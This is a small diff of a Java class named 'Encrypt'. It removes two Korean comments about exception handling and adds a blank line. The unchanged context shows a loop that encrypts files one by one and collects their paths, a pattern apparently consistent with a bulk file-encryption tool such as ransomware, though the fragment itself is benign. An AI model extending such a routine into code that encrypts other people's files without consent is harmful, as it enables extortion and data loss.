@@ -41,10 +41,8 @@ public class Encrypt {
                             try {
                                 encryptFile(file);
                                 encryptedFiles.add(file.getAbsolutePath());
-                                // 접근 권한 예외 처리
                             } catch (AccessDeniedException e) {
                                 System.err.println("Access denied for file: " + file.getPath());
-                                // 파일 시스템 예외 처리
                             } catch (FileSystemException e) {
                                 System.err.println("File system exception for file: " + file.getPath());
                             }
@@ -55,6 +53,7 @@ public class Encrypt {
             }
         }
     }
+
 
 
     private static void encryptFile(File file) throws Exception {
